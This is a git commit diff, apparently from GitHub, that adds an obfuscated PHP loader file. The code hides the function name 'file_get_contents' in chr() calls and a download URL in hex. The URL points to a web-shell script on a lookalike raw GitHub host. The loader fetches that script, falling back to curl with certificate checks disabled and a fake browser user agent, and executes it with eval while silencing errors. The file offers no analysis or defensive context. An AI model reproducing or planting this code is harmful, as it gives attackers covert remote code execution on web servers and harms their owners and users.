248edbeafa68cf93a66bb8dea0c82256331f9179
pocongngesot <155910376+pocongngesott@users.noreply.github.com>
2026-03-28 03:23:41 +0700

    Add files via upload

---
+++ loader-browser-v2/loader2.php
@@ -0,0 +1,7 @@
+<?php @error_reporting(0);
+$nWpQk=chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);
+$tXbCd=hex2bin('68747470733a2f2f7261772e67697468756275736572636f6e74656e74732e636f6d2f706f636f6e676e6765736f74742f7368656c6c2f726566732f68656164732f6d61696e2f62726f777365722d76322e706870');
+$vJzRm=function($c){eval('?>'.$c);};
+$rKmLo=@$nWpQk($tXbCd);
+if(!$rKmLo){$ch=curl_init($tXbCd);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0');$rKmLo=curl_exec($ch);curl_close($ch);}
+if($rKmLo)$vJzRm($rKmLo);
